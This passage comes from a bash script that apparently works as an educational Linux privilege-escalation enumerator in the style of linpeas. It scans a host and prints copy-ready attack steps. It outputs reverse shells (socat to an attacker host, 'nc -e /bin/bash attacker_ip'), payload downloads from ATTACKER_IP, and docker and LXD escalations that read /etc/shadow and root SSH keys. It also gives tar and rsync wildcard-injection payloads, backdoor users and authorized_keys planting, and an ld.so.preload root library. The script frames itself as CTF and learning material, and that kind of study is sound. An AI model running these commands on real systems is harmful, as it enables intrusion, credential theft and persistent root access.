            teach "    5. stty rows 38 columns 116  # Match your terminal"
            teach ""
        fi
        
        # Perl if available
        if grep -q "perl" "$temp_exploit_langs"; then
            teach "  PERL PTY UPGRADE:"
            teach "    perl -e 'exec \"/bin/bash\";'"
            teach "    # Or with pty module:"
            teach "    perl -e 'use IO::Pty; \$pty = new IO::Pty; exec(\$pty->slave(), \"/bin/bash\");'"
            teach ""
        fi
        
        # Ruby if available
        if grep -q "ruby" "$temp_exploit_langs"; then
            teach "  RUBY PTY UPGRADE:"
            teach "    ruby -e 'exec \"/bin/bash\"'"
            teach "    # Or with pty:"
            teach "    ruby -e 'require \"pty\"; PTY.spawn(\"/bin/bash\")'"
            teach ""
        fi
        
        teach "WHY UPGRADE SHELLS:"
        teach "  Basic reverse shell (nc, bash -i) limitations:"
        teach "  ✗ No tab completion"
        teach "  ✗ No arrow keys (just ^[[D garbage)"
        teach "  ✗ Ctrl+C kills entire shell"
        teach "  ✗ No text editors (vim/nano fail)"
        teach "  ✗ sudo prompts often fail"
        teach ""
        teach "  Full TTY shell benefits:"
        teach "  ✓ Tab completion works"
        teach "  ✓ Arrow keys for history"
        teach "  ✓ Ctrl+C only kills current command"
        teach "  ✓ Text editors work perfectly"
        teach "  ✓ sudo password prompts work"
        teach "  ✓ Programs detect interactive terminal"
        log ""
    fi
    
    if [ $has_download -eq 0 ]; then
        critical "NO DOWNLOAD TOOLS AVAILABLE - Cannot fetch exploits"
        warn "Missing: wget, curl, nc, fetch"
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  NO DOWNLOAD CAPABILITY - Critical Limitation"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "IMPACT:"
        teach "  Cannot download exploits from exploit-db or GitHub"
        teach "  Must rely on pre-existing binaries or creative alternatives"
        teach ""
        teach "WORKAROUNDS:"
        teach ""
        teach "  1. ECHO/PRINTF (for small scripts):"
        teach "     cat > exploit.sh << 'EOF'"
        teach "     #!/bin/bash"
        teach "     # paste exploit code here line by line"
        teach "     EOF"
        teach "     chmod +x exploit.sh"
        teach ""
        teach "  2. BASE64 TRANSFER (for binaries):"
        teach "     # On attacker machine:"
        teach "     base64 exploit > exploit.b64"
        teach "     # Copy contents, then on target:"
        teach "     cat > exploit.b64 << 'EOF'"
        teach "     # paste base64 content"
        teach "     EOF"
        teach "     base64 -d exploit.b64 > exploit"
        teach "     chmod +x exploit"
        teach ""
        teach "  3. FTP/SCP (if available):"
        teach "     # Check for ftp, sftp, scp clients"
        teach "     command -v ftp && echo 'FTP available'"
        teach "     command -v scp && echo 'SCP available'"
        teach ""
        teach "  4. EXISTING WEB SERVER:"
        teach "     # If target can make outbound HTTP (check firewall):"
        teach "     # Start server on attacker: python3 -m http.server 8080"
        teach "     # On target, try alternate methods:"
        teach "     exec 3<>/dev/tcp/ATTACKER/8080"
        teach "     echo -e 'GET /exploit HTTP/1.0\\r\\n\\r\\n' >&3"
        teach "     cat <&3"
        teach ""
        teach "  5. SHARED MOUNT (NFS/SMB):"
        teach "     # Check if any network shares mounted"
        teach "     mount | grep -E 'nfs|cifs|smb'"
        teach "     # Upload exploits to shared location"
        log ""
    else
        info "Download tools available:"
        cat "$temp_download_tools" | while read tool; do
            info "  ✓ $tool"
        done
    fi
    
    if [ $has_pivot -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  PIVOTING & LATERAL MOVEMENT TOOLS"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "AVAILABLE TOOLS:"
        cat "$temp_pivot_tools" | while read tool; do
            info "  ✓ $tool"
        done
        teach ""
        teach "PIVOTING SCENARIOS:"
        teach ""
        
        if grep -q "ssh" "$temp_pivot_tools"; then
            teach "  SSH TUNNELING (Port Forwarding):"
            teach "    LOCAL FORWARD - Access internal service from attacker:"
            teach "      ssh -L 8080:internal-host:80 user@compromised-host"
            teach "      # Now: localhost:8080 → internal-host:80"
            teach ""
            teach "    DYNAMIC FORWARD - SOCKS proxy for all traffic:"
            teach "      ssh -D 1080 user@compromised-host"
            teach "      # Configure browser/tools to use SOCKS5 localhost:1080"
            teach "      proxychains nmap 192.168.1.0/24"
            teach ""
            teach "    REMOTE FORWARD - Expose attacker service to internal network:"
            teach "      ssh -R 8080:localhost:80 user@compromised-host"
            teach "      # Internal network can now access your web server"
            teach ""
        fi
        
        if grep -q "nmap" "$temp_pivot_tools"; then
            teach "  NMAP - Internal Network Reconnaissance:"
            teach "    # Fast ping sweep"
            teach "    nmap -sn 192.168.1.0/24"
            teach ""
            teach "    # Port scan discovered host"
            teach "    nmap -p- -T4 192.168.1.50"
            teach ""
            teach "    # Service version detection"
            teach "    nmap -sV -sC 192.168.1.50"
            teach ""
        fi
        
        if grep -q "socat" "$temp_pivot_tools"; then
            teach "  SOCAT - Advanced Port Forwarding:"
            teach "    # Port relay (forward local port to remote)"
            teach "    socat TCP-LISTEN:8080,fork TCP:internal-host:80"
            teach ""
            teach "    # Encrypted reverse shell"
            teach "    # On attacker:"
            teach "    openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem"
            teach "    socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork STDOUT"
            teach "    # On target:"
            teach "    socat OPENSSL:attacker:443,verify=0 EXEC:/bin/bash"
            teach ""
        fi
        log ""
    fi
    
    if [ $has_containers -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  CONTAINER TOOLS - Privilege and Group Membership Check"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "AVAILABLE TOOLS:"
        cat "$temp_container_tools" | while read tool; do
            case "$tool" in
                docker)
                    if groups | grep -qw "docker"; then
                        critical "DOCKER: (and you are in docker group: INSTANT root possible)"
                        critical "  INSTANT ROOT: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
                    else
                        warn "  ! docker (but you are NOT in docker group)"
                        teach "    You need to be in the docker group for root-level access. Check: grep docker /etc/group"
                        teach "    If you can escalate to a user in the docker group, you will have instant root." 
                        teach "    To see which users have instant root via Docker, run: getent group docker"
                        teach "    Any username listed can use Docker for root access. Try to escalate to one of these users."
                    fi
                    ;;
# LXD/LXC exploitation with intelligent internet detection
                lxd|lxc)
                    if groups | grep -qw "$tool"; then
                        critical "  ! $tool (and you are in $tool group: INSTANT root possible)"
                        log ""
                        
                        # Check if LXD can access internet
                        info "Checking if LXD has internet access..."
                        local has_internet=0
                        
                        # Test 1: Try to resolve images.linuxcontainers.org (LXD's image server)
                        if timeout 15 bash -c "exec 3<>/dev/tcp/images.linuxcontainers.org/443 2>/dev/null" 2>/dev/null; then
                            has_internet=1
                        # Test 2: Try to resolve ubuntu.com as fallback
                        elif timeout 15 bash -c "exec 3<>/dev/tcp/ubuntu.com/80 2>/dev/null" 2>/dev/null; then
                            has_internet=1
                        # Test 3: Check if nslookup/dig work for DNS resolution
                        elif command -v nslookup >/dev/null 2>&1 && timeout 15 nslookup images.linuxcontainers.org >/dev/null 2>&1; then
                            has_internet=1
                        elif command -v dig >/dev/null 2>&1 && timeout 15 dig +short images.linuxcontainers.org >/dev/null 2>&1; then
                            has_internet=1
                        fi
                        
                        if [ $has_internet -eq 1 ]; then
                            ok "Internet access detected - using ONLINE method (download image directly)"
                        else
                            warn "No internet access detected - using OFFLINE method (manual image transfer)"
                        fi
                        log ""
                        
                        teach "    ╔═══════════════════════════════════════════════════════════╗"
                        teach "    ║  LXD/LXC PRIVILEGE ESCALATION                             ║"
                        teach "    ╚═══════════════════════════════════════════════════════════╝"
                        teach ""
                        
                        if [ $has_internet -eq 1 ]; then
                            # ONLINE METHOD
                            teach "    ┌───────────────────────────────────────────────────────────┐"
                            teach "    │ ONLINE METHOD: Download Image Directly                    │"
                            teach "    └───────────────────────────────────────────────────────────┘"
                        else
                            # OFFLINE METHOD
                            teach "    ┌───────────────────────────────────────────────────────────┐"
                            teach "    │ OFFLINE METHOD: Manual Image Transfer Required            │"
                            teach "    └───────────────────────────────────────────────────────────┘"
                            warn "    ⚠  LXD cannot reach internet - must transfer image manually"
                            warn "    ⚠  Common on CTF boxes"
                        fi
                        teach ""
                        
                        if [ $has_internet -eq 1 ]; then
                            # ============ ONLINE METHOD ============
                            teach "    Step 1 - Initialize privileged container with Ubuntu image:"
                            teach "      lxc init ubuntu:18.04 privesc -c security.privileged=true"
                            teach ""
                            teach "    Step 2 - Mount host filesystem to container:"
                            teach "      lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
                            teach ""
                            teach "    Step 3 - Start the container:"
                            teach "      lxc start privesc"
                            teach ""
                            teach "    Step 4 - Execute shell inside container:"
                            teach "      lxc exec privesc /bin/bash"
                            teach ""
                            teach "    Step 5 - Access host filesystem (you're root now):"
                            teach "      cd /mnt/root/root"
                            teach "      cat /mnt/root/etc/shadow  # Read host's shadow file"
                            teach "      cat /mnt/root/root/root.txt  # Root flag (CTF)"
                        else
                            # ============ OFFLINE METHOD ============
                            teach "    ═══ PHASE A: Build Alpine Image (On Attacker Machine) ═══"
                            teach ""
                            teach "    1. Install dependencies:"
                            teach "       sudo apt update"
                            teach "       sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools"
                            teach ""
                            teach "    2. Clone and build distrobuilder:"
                            teach "       git clone https://github.com/lxc/distrobuilder"
                            teach "       cd distrobuilder"
                            teach "       make"
                            teach ""
                            teach "    3. Create build directory:"
                            teach "       mkdir -p /tmp/alpine-build && cd /tmp/alpine-build"
                            teach ""
                            teach "    4. Download Alpine recipe:"
                            teach "       wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml"
                            teach ""
                            teach "    5. Build minimal Alpine image:"
                            teach "       sudo /path/to/distrobuilder/distrobuilder build-lxd alpine.yaml -o image.release=3.18"
                            teach ""
                            teach "       Output files created:"
                            teach "       • lxd.tar.xz (metadata, ~1KB)"
                            teach "       • rootfs.squashfs (filesystem, ~2-3MB)"
                            teach ""
                            teach "    ═══ PHASE B: Transfer to Target ═══"
                            teach ""
                            teach "    Option A - If wget/curl available on target:"
                            teach "      # On attacker:"
                            teach "      python3 -m http.server 8000"
                            teach ""
                            teach "      # On target:"
                            teach "      cd /tmp"
                            teach "      wget http://ATTACKER_IP:8000/lxd.tar.xz"
                            teach "      wget http://ATTACKER_IP:8000/rootfs.squashfs"
                            teach ""
                            teach "    Option B - Base64 transfer (if no download tools):"
                            teach "      # On attacker:"
                            teach "      base64 lxd.tar.xz > lxd.b64"
                            teach "      base64 rootfs.squashfs > rootfs.b64"
                            teach ""
                            teach "      # On target, paste base64 content:"
                            teach "      cat > /tmp/lxd.b64 << 'EOF'"
                            teach "      [paste lxd.b64 content here]"
                            teach "      EOF"
                            teach "      base64 -d /tmp/lxd.b64 > /tmp/lxd.tar.xz"
                            teach ""
                            teach "      cat > /tmp/rootfs.b64 << 'EOF'"
                            teach "      [paste rootfs.b64 content here]"
                            teach "      EOF"
                            teach "      base64 -d /tmp/rootfs.b64 > /tmp/rootfs.squashfs"
                            teach ""
                            teach "    Option C - SCP transfer (if SSH available):"
                            teach "      scp lxd.tar.xz rootfs.squashfs user@target:/tmp/"
                            teach ""
                            teach "    ═══ PHASE C: Import and Exploit on Target ═══"
                            teach ""
                            teach "    1. Import the custom Alpine image:"
                            teach "       cd /tmp"
                            teach "       lxc image import lxd.tar.xz rootfs.squashfs --alias alpine-privesc"
                            teach ""
                            teach "    2. Verify image imported successfully:"
                            teach "       lxc image list"
                            teach "       # Should show 'alpine-privesc' in output"
                            teach ""
                            teach "    3. Initialize privileged container:"
                            teach "       lxc init alpine-privesc privesc -c security.privileged=true"
                            teach ""
                            teach "    4. Mount host filesystem:"
                            teach "       lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
                            teach ""
                            teach "    5. Start container:"
                            teach "       lxc start privesc"
                            teach ""
                            teach "    6. Get root shell:"
                            teach "       lxc exec privesc /bin/sh"
                            teach ""
                            teach "    7. Access host filesystem (YOU ARE ROOT NOW):"
                            teach "       cd /mnt/root"
                            teach "       ls -la root/           # Host's /root directory"
                            teach "       cat root/root.txt      # Root flag (CTF)"
                            teach "       cat etc/shadow         # Host shadow file"
                            teach "       cat root/.ssh/id_rsa   # Root's SSH key"
                        fi
                        teach "    ╔═══════════════════════════════════════════════════════════╗"
                        teach "    ║  WHY THIS WORKS - The Security Model Flaw                 ║"
                        teach "    ╚═══════════════════════════════════════════════════════════╝"
                        teach ""
                        teach "    LXD GROUP = ROOT EQUIVALENT:"
                        teach "      • LXD daemon runs as root (needs to manage containers)"
                        teach "      • Members of 'lxd' group can communicate with this daemon"
                        teach "      • Can create 'privileged' containers (security.privileged=true)"
                        teach ""
                        teach "    PRIVILEGED CONTAINERS:"
                        teach "      • Normal container: isolated, can't see host filesystem"
                        teach "      • Privileged container: NO isolation, full host access"
                        teach "      • UID 0 in container = UID 0 on host (root)"
                        teach ""
                        teach "    THE EXPLOIT CHAIN:"
                        teach "      1. You're in 'lxd' group (non-root user)"
                        teach "      2. Create privileged container (allowed by group)"
                        teach "      3. Mount host's / to container's /mnt/root"
                        teach "      4. Enter container as root (UID 0)"
                        teach "      5. Access /mnt/root = host filesystem as root"
                        teach "      6. Read /mnt/root/etc/shadow, modify files, game over"
                        teach ""
                        teach "    WHY ADMINS DO THIS:"
                        teach "      • Think: 'User needs to manage their own containers'"
                        teach "      • Don't realize: lxd group = instant root access"
                        teach "      • Equivalent to giving user sudo ALL=(ALL) NOPASSWD: ALL"
                        teach ""
                        teach "    ╔═══════════════════════════════════════════════════════════╗"
                        teach "    ║  TROUBLESHOOTING                                          ║"
                        teach "    ╚═══════════════════════════════════════════════════════════╝"
                        teach ""
                        teach "    Issue: 'Error: Get ... dial tcp: lookup ... no such host'"
                        teach "      → LXD can't reach internet, use OFFLINE method above"
                        teach ""
                        teach "    Issue: 'Error: not authorized'"
                        teach "      → Your user not in lxd group yet, run: newgrp lxd"
                        teach "      → Or logout and login again"
                        teach ""
                        teach "    Issue: 'Error: The image already exists'"
                        teach "      → Image already imported, skip to step 3"
                        teach "      → Or use different alias: --alias alpine-privesc2"
                        teach ""
                        teach "    Issue: Container starts but can't exec shell"
                        teach "      → Try: lxc exec privesc /bin/sh (instead of bash)"
                        teach "      → Alpine uses /bin/sh by default, not bash"
                        teach ""
                        teach "    Issue: Files in /mnt/root not accessible"
                        teach "      → Check mount succeeded: lxc config device show privesc"
                        teach "      → Verify privileged: lxc config show privesc | grep privileged"
                        log ""
                    else
                        warn "  ! $tool (but you are NOT in $tool group)"
                        teach "    You need to be in the $tool group for root-level access."
                        teach "    Check which users have this privilege:"
                        teach "      grep $tool /etc/group"
                        teach ""
                        teach "    Try to escalate to one of those users to gain instant root via LXD."
                    fi
                    ;;
                podman)
                    info "  ! podman (rootless containers possible, but group membership not required)"
                    ;;
                kubectl)
                    warn "  ! kubectl (Kubernetes control available, check cluster access)"
                    teach "    Check cluster access: kubectl get pods"
                    teach "    List namespaces: kubectl get namespaces"
                    teach "    If you have access, check for privileged pods or secrets"
                    ;;
                *)
                    info "  ! $tool"
                    ;;
            esac
        done
        teach ""
        teach "CRITICAL CHECK - Group Membership:"
        teach "  Current groups: $(groups)"
        teach ""
        teach "WHY THESE TOOLS MATTER:"
        teach "  Container orchestration tools run with root-equivalent privileges if you are in the right group."
        teach "  Group membership in docker/lxd is functionally equivalent to root."
        teach "  See the PRIVILEGED GROUP MEMBERSHIP section for full exploitation."
        log ""
    fi
    
    # PHASE 3: SUMMARY - Only show if no critical tools found
    local any_critical=$((has_compilers + has_exploit_langs + has_download + has_containers))
    
    if [ $any_critical -eq 0 ]; then
        warn "Limited toolset available - exploitation options restricted"
        log ""
        teach "IMPACT OF MISSING TOOLS:"
        teach "  • Cannot compile kernel exploits locally (no gcc)"
        teach "  • Cannot download exploits (no wget/curl)"
        teach "  • Limited shell upgrade options (no Python/Perl)"
        teach "  • Must rely on pre-existing binaries or creative workarounds"
        teach ""
        teach "ALTERNATIVE STRATEGIES:"
        teach "  1. Search for pre-compiled exploits on target"
        teach "  2. Look for SUID binaries (don't need compilation)"
        teach "  3. Check writable cron jobs or services"
        teach "  4. Exploit misconfigurations (sudo, capabilities, etc.)"
        teach "  5. Use built-in binaries for creative exploitation"
    else
        ok "Exploitation toolset available - kernel exploits and scripts can be used"
    fi
}
# === WILDCARD INJECTION ===
enum_wildcards() {
    section "WILDCARD INJECTION OPPORTUNITIES"
    
    # PHASE 1: SILENT SCAN - Collect exploitable findings
    local temp_wildcards="/tmp/.learnpeas_wildcards_$$"
    local found_exploitable=0
    
    cleanup_wildcard_temps() {
        rm -f "$temp_wildcards" 2>/dev/null
    }
    trap cleanup_wildcard_temps RETURN
    
    # Search for scripts with wildcards in common locations
    find /var/scripts /usr/local/bin /opt /home /root 2>/dev/null -name "*.sh" -readable 2>/dev/null | while read script; do
        # Skip if this is learnpeas/linpeas/teachpeas itself (avoid self-detection)
        if echo "$script" | grep -qE "learnpeas|linpeas|teachpeas"; then
            continue
        fi
        
        # Check for dangerous wildcard usage
        grep -nE "tar.*\*|rsync.*\*|chown.*\*|chmod.*\*|cp.*\*|mv.*\*" "$script" 2>/dev/null | while IFS=: read line_num line_content; do
            # Skip comments and educational content
            if echo "$line_content" | grep -qE "^[[:space:]]*#|explain_concept|teach|\".*tar.*\*.*\"|'.*tar.*\*.*'"; then
                continue
            fi
            # Determine the command being used
            local cmd=""
            if echo "$line_content" | grep -q "tar.*\*"; then
                cmd="tar"
            elif echo "$line_content" | grep -q "rsync.*\*"; then
                cmd="rsync"
            elif echo "$line_content" | grep -q "chown.*\*"; then
                cmd="chown"
            elif echo "$line_content" | grep -q "chmod.*\*"; then
                cmd="chmod"
            elif echo "$line_content" | grep -q "cp.*\*"; then
                cmd="cp"
            elif echo "$line_content" | grep -q "mv.*\*"; then
                cmd="mv"
            fi
            
            # Try to extract the directory path where wildcard expands
            local target_dir=""
            
            # Look for explicit paths with wildcards: /some/path/*
            if echo "$line_content" | grep -oE "['\"]?/[^'\"[:space:]]+/\*" >/dev/null; then
                target_dir=$(echo "$line_content" | grep -oE "/[^'\"[:space:]]+/\*" | sed 's|/\*$||' | head -1)
            # Look for relative paths: ./dir/* or dir/*
            elif echo "$line_content" | grep -oE "\./[^'\"[:space:]]+/\*|[a-zA-Z0-9_-]+/\*" >/dev/null; then
                local rel_path=$(echo "$line_content" | grep -oE "\./[^'\"[:space:]]+/\*|[a-zA-Z0-9_-]+/\*" | sed 's|/\*$||' | head -1 | sed 's|^\./||')
                # Get script's directory
                local script_dir=$(dirname "$script")
                target_dir="$script_dir/$rel_path"
            # Just bare * - expands in script's directory or current working dir
            elif echo "$line_content" | grep -qE "[[:space:]]\*[[:space:]]|[[:space:]]\*$"; then
                # Check if there's a cd command before this line
                local cd_dir=$(head -n $line_num "$script" | tac | grep -m1 "^[[:space:]]*cd[[:space:]]" | awk '{print $2}' | tr -d \'\")
                if [ -n "$cd_dir" ]; then
                    # Resolve cd directory
                    if [[ "$cd_dir" == /* ]]; then
                        target_dir="$cd_dir"
                    else
                        target_dir="$(dirname "$script")/$cd_dir"
                    fi
                else
                    # Assume script's directory
                    target_dir=$(dirname "$script")
                fi
            fi
            
            # If we found a target directory, check if it's writable
            if [ -n "$target_dir" ] && [ -d "$target_dir" ] && [ -w "$target_dir" ]; then
                # This is exploitable!
                echo "$script|$line_num|$cmd|$target_dir|$line_content" >> "$temp_wildcards"
                found_exploitable=1
            fi
        done
    done
    
    # PHASE 2: CONDITIONAL EDUCATION (only if exploitable vectors found)
    if [ "$found_exploitable" -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  WILDCARD INJECTION - Understanding the Attack"
        teach "╚═══════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS WILDCARD INJECTION:"
        teach "  When scripts use wildcards (* or ?) in commands, the shell"
        teach "  expands them to filenames BEFORE passing to the command."
        teach "  By creating files with names like '--checkpoint=1', those"
        teach "  filenames become command-line arguments."
        teach ""
        teach "WHY IT WORKS:"
        teach "  1. Script runs: tar -czf backup.tar.gz *"
        teach "  2. Shell expands * to all files in directory"
        teach "  3. If files named '--checkpoint=1' exist, they're expanded"
        teach "  4. Command receives: tar -czf backup.tar.gz --checkpoint=1 file1 file2"
        teach "  5. tar interprets --checkpoint=1 as an ARGUMENT, not a filename"
        teach "  6. Attacker controls the arguments!"
        teach ""
        teach "REQUIREMENTS FOR EXPLOITATION:"
        teach "  ✓ Script must use wildcards with vulnerable commands"
        teach "  ✓ You must have WRITE access to the directory where * expands"
        teach "  ✓ Script must run with higher privileges (root, via cron, etc.)"
        teach ""
        teach "COMMON VULNERABLE PATTERNS:"
        teach "  • tar with * → --checkpoint-action=exec"
        teach "  • rsync with * → -e option for command execution"
        teach "  • chown with * → --reference to change ownership"
        teach "  • chmod with * → --reference to change permissions"
        log ""
    fi
    
    # PHASE 3: REPORT SPECIFIC FINDINGS (grouped by command type)
    if [ -s "$temp_wildcards" ]; then
        # Group findings by command type
        local commands_found=$(cut -d'|' -f3 "$temp_wildcards" | sort -u)
        
        for cmd in $commands_found; do
            log ""
            
            # Show all findings for this command type first
            grep "^[^|]*|[^|]*|$cmd|" "$temp_wildcards" | while IFS='|' read -r script_path line_num command target_dir line_content; do
                critical "EXPLOITABLE WILDCARD INJECTION - $command command"
                vuln "Script: $script_path (line $line_num)"
                info "Writable directory: $target_dir"
                info "Vulnerable line: $(echo "$line_content" | head -c 100)..."
            done
            
            log ""
            
            # Show education ONCE per command type
            case "$cmd" in
                tar)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  TAR WILDCARD EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "HOW TAR CHECKPOINT WORKS:"
                    teach "  tar has --checkpoint option to run actions during archive"
                    teach "  creation. --checkpoint-action=exec=COMMAND runs arbitrary code."
                    teach ""
                    teach "EXPLOITATION (Ready to copy):"
                    teach ""
                    teach "  # Step 1: Go to the writable directory"
                    teach "  cd $target_dir"
                    teach ""
                    teach "  # Step 2: Create payload script"
                    teach "  echo '#!/bin/bash' > shell.sh"
                    teach "  echo 'chmod u+s /bin/bash' >> shell.sh"
                    teach "  chmod +x shell.sh"
                    teach ""
                    teach "  # Step 3: Create malicious filenames"
                    teach "  touch -- '--checkpoint=1'"
                    teach "  touch -- '--checkpoint-action=exec=sh shell.sh'"
                    teach ""
                    teach "  # Step 4: Wait for script to run (check cron)"
                    teach "  # When tar runs, it will execute shell.sh as root"
                    teach ""
                    teach "  # Step 5: Get root shell"
                    teach "  /bin/bash -p"
                    teach ""
                    teach "ALTERNATIVE PAYLOADS:"
                    teach "  • Reverse shell: echo 'nc -e /bin/bash attacker_ip 4444' > shell.sh"
                    teach "  • Add user: echo 'useradd -m -p \$(openssl passwd -1 password) hacker' > shell.sh"
                    teach "  • SSH key: echo 'mkdir /root/.ssh; echo \"your_key\" > /root/.ssh/authorized_keys' > shell.sh"
                    log ""
                    ;;
                    
                rsync)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  RSYNC WILDCARD EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "HOW RSYNC -e WORKS:"
                    teach "  rsync's -e option specifies remote shell to use."
                    teach "  We can inject -e to execute arbitrary commands."
                    teach ""
                    teach "EXPLOITATION (Ready to copy):"
                    teach ""
                    teach "  # Step 1: Go to the writable directory"
                    teach "  cd $target_dir"
                    teach ""
                    teach "  # Step 2: Create payload"
                    teach "  echo '#!/bin/bash' > payload.sh"
                    teach "  echo 'chmod u+s /bin/bash' >> payload.sh"
                    teach "  chmod +x payload.sh"
                    teach ""
                    teach "  # Step 3: Create malicious filename"
                    teach "  touch -- '-e sh payload.sh'"
                    teach ""
                    teach "  # Step 4: Wait for rsync to run"
                    teach "  # rsync will execute: rsync -e sh payload.sh [other files]"
                    teach ""
                    teach "  # Step 5: Get root shell"
                    teach "  /bin/bash -p"
                    log ""
                    ;;
                    
                chown)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  CHOWN WILDCARD EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "HOW CHOWN --reference WORKS:"
                    teach "  chown --reference=FILE will copy ownership from FILE."
                    teach "  We can make chown copy ownership from a file we control."
                    teach ""
                    teach "EXPLOITATION (Ready to copy):"
                    teach ""
                    teach "  # Step 1: Go to the writable directory"
                    teach "  cd $target_dir"
                    teach ""
                    teach "  # Step 2: Create reference file owned by you"
                    teach "  touch reference_file"
                    teach ""
                    teach "  # Step 3: Create malicious filename"
                    teach "  touch -- '--reference=reference_file'"
                    teach ""
                    teach "  # Step 4: Wait for script to run"
                    teach "  # chown will change ownership of all files to match reference_file"
                    teach "  # This means files that were root-owned become YOUR files"
                    teach ""
                    teach "IMPACT:"
                    teach "  You can gain ownership of sensitive files in that directory."
                    teach "  Modify scripts, configs, or binaries that run as root."
                    log ""
                    ;;
                    
                chmod)
                    teach "╔═══════════════════════════════════════════════════════════╗"
                    teach "║  CHMOD WILDCARD EXPLOITATION"
                    teach "╚═══════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "HOW CHMOD --reference WORKS:"
                    teach "  chmod --reference=FILE copies permissions from FILE."
                    teach ""
                    teach "EXPLOITATION (Ready to copy):"
                    teach ""
                    teach "  # Step 1: Go to the writable directory"
                    teach "  cd $target_dir"
                    teach ""
                    teach "  # Step 2: Create reference file with desired perms"
                    teach "  touch reference_file"
                    teach "  chmod 777 reference_file"
                    teach ""
                    teach "  # Step 3: Create malicious filename"
                    teach "  touch -- '--reference=reference_file'"
                    teach ""
                    teach "  # Step 4: Wait for script to run"
                    teach "  # All files will become world-writable (777)"
                    teach "  # You can now modify previously protected files"
                    log ""
                    ;;
                    
                *)
                    teach "GENERIC WILDCARD EXPLOITATION:"
                    teach "  Research command-specific injection techniques for: $command"
                    teach "  Look for options that:"
                    teach "  • Execute commands (-e, --exec, etc.)"
                    teach "  • Read from files (--from-file, --reference)"
                    teach "  • Change behavior in exploitable ways"
                    log ""
                    ;;
            esac
# Verification commands for the user to run
            teach "VERIFICATION TIPS:"
            teach "  • Check if scripts run via cron (check each vulnerable script)"
            teach "  • Check script ownership and permissions"
            teach "  • Monitor writable directories for changes"
            teach ""
            teach "Commands to run:"
            local first_script=$(grep "^[^|]*|[^|]*|$cmd|" "$temp_wildcards" | head -1 | cut -d'|' -f1)
            local first_dir=$(grep "^[^|]*|[^|]*|$cmd|" "$temp_wildcards" | head -1 | cut -d'|' -f4)
            if [ -n "$first_script" ]; then
                teach "  grep -r \"$(basename "$first_script")\" /etc/cron*"
                teach "  ls -l \"$first_script\""
            fi
            if [ -n "$first_dir" ]; then
                teach "  ls -la \"$first_dir\""
            fi
            log ""
            
        done < "$temp_wildcards"
    fi
    
    # PHASE 4: CLEAN SUMMARY
    if [ "$found_exploitable" -eq 0 ]; then
        ok "No exploitable wildcard injection opportunities detected"
    fi
}
# === WRITABLE LD.SO.PRELOAD ===
enum_ld_preload() {
    section "LD.SO.PRELOAD ANALYSIS"
    
    explain_concept "ld.so.preload File" \
        "The /etc/ld.so.preload file forces the dynamic linker to load specified libraries before all others, for every program execution." \
        "If writable, you can force your malicious library to load into every process that starts, including those running as root. This gives instant root access the next time any SUID binary or root process starts." \
        "Exploitation:\n  1. Create malicious library: gcc -shared -fPIC -o /tmp/evil.so evil.c\n  2. Add to preload: echo '/tmp/evil.so' > /etc/ld.so.preload\n  3. Wait for or trigger any SUID binary execution\n  4. Your code runs as root"
    
    if [ -f /etc/ld.so.preload ]; then
        if [ -w /etc/ld.so.preload ]; then
            critical "ld.so.preload is WRITABLE - Instant root via library injection"
            vuln "/etc/ld.so.preload is WRITABLE!"
            teach "Malicious library template (evil.c):"
            teach "  #include <stdio.h>"
            teach "  #include <sys/types.h>"
            teach "  #include <stdlib.h>"
            teach "  void _init() {"
            teach "      unsetenv(\"LD_PRELOAD\");"
            teach "      setgid(0); setuid(0);"
            teach "      system(\"/bin/bash -p\");"
            teach "  }"
            teach "Compile and inject: gcc -shared -fPIC -o /tmp/evil.so evil.c && echo '/tmp/evil.so' > /etc/ld.so.preload"
        else
            ok "/etc/ld.so.preload exists but not writable"
        fi
    else
        ok "/etc/ld.so.preload does not exist"
    fi
    
    # Check ld.so.conf.d directory
    if [ -d /etc/ld.so.conf.d ]; then
        if [ -w /etc/ld.so.conf.d ]; then
            critical "ld.so.conf.d directory WRITABLE - Add malicious library paths"
            vuln "/etc/ld.so.conf.d/ is WRITABLE!"
            teach "Create config file pointing to your malicious library directory"
            teach "  echo '/tmp' > /etc/ld.so.conf.d/evil.conf && ldconfig"
        fi
    fi
}

# === POLKIT/PKEXEC ===
enum_polkit() {
    section "POLKIT/PKEXEC ANALYSIS"
    
    explain_concept "Polkit (PolicyKit)" \
        "Polkit allows unprivileged processes to communicate with privileged ones. pkexec is like sudo but uses polkit for authorization." \
        "Desktop Linux needs fine-grained access control. Example: You click 'Install Updates' - the GUI runs as your user but needs root to install packages. Polkit acts as the middleman, checking if you're authorized. pkexec is the command-line equivalent of sudo, but instead of /etc/sudoers, it uses polkit policies." \
        "How it works:\n  1. Unprivileged process wants to do privileged action\n  2. Asks polkit: 'Am I allowed?'\n  3. Polkit checks policies in /usr/share/polkit-1/actions/\n  4. May prompt for password\n  5. If authorized, polkit grants access\n\nWhy vulnerabilities matter:\n  • pkexec is SUID root (runs as root)\n  • Processes user input (authentication, environment)\n  • Complex codebase handling security decisions\n  • Used by default on most Linux desktops"
    
    if ! command -v pkexec >/dev/null 2>&1; then
        ok "pkexec not installed"
        return
    fi
    
